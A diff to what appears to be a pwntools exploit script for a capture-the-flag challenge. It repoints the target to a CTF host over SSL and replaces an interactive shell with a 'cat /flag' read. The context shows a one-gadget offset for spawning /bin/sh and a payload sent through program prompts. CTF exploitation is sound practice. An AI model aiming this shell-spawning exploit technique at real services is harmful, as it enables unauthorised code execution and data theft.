@@ -20,8 +20,9 @@ ONE_GADGET = 0xEF0A6  # execve("/bin/sh", r9, r10)
 
 if not args.LOCAL:
     r = remote(
-        "determined_joliot.orb.local",
-        1337,
+        "e14ac623-e68f-4b74-83bc-1e7d45b73017.play-dev.gaslightctf.cooking",
+        31337,
+        ssl=True,
     )
 else:
     # pty, otherwise the unflushed printf() prompts never reach us
@@ -51,6 +52,8 @@ r.sendlineafter(b"subject? ", b"")
 r.sendlineafter(b"subject? ", b"")
 r.sendlineafter(b"useful? ", payload)
 r.recvuntil(b"clearing")
+r.recvline()
 
-r.sendline(b"echo $(</flag)")  # no coreutils on the box, so no cat
-r.interactive()
+r.sendline(b"cat /flag")
+flag = r.recvline()
+log.success(f"{flag=}")
